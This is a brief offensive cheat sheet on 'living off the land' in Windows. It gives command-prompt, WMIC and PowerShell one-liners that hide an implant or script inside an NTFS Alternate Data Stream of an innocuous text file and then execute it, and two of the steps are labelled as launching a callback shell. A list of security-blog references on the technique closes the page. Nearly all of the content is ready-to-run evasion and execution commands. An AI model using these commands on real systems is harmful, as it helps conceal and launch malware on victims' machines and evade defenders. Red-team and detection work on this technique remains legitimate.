# Living off the Land

## 01 - Command Prompt

### 1.1 - Basics

Hide the file by appending inside an existing file.

```
C:\> type implant.exe > file.txt:implant.exe
```

Execute it

```
C:\> start file.txt:implant.exe
```

### 1.2 - WMIC

Execute Callback Shell via ADS

```
C:\> wmic.exe process create "c:\path\to\file.txt:implant.exe"
```

## 02 - PowerShell

### 2.1 - Basics

Hide the file by appending inside an existing file.

```
PS C:\> Set-Content file.txt -Stream script.ps1 -Value implant.ps1
```

Execute Callback Shell via ADS

```
PS C:\> Get-Content file.txt -Stream implant.ps1 | iex
```

---
## References

- [LOLBAS (Living Off The Land Binaries, Scripts and Libraries)](https://lolbas-project.github.io)

- [r00t-3xp10it: ADS](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/ADS.md)

- [Hacking Articles: Defense Evasion Alternate Data Streams](https://www.hackingarticles.in/defense-evasion-alternate-data-streams/)

- [InfoSec Writeups: Alternate Data Streams ADS](https://infosecwriteups.com/alternate-data-streams-ads-54b144a831f1)

- [OddVar Moe: Putting Data in Alternate Data Streams and How to Execute it](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)

- [CqureAcademy: Alternate Data Streams](https://cqureacademy.com/blog/alternate-data-streams)

- [ThreatSpike: Alternate Data Streams](https://www.threatspike.com/blogs/alternate-data-streams)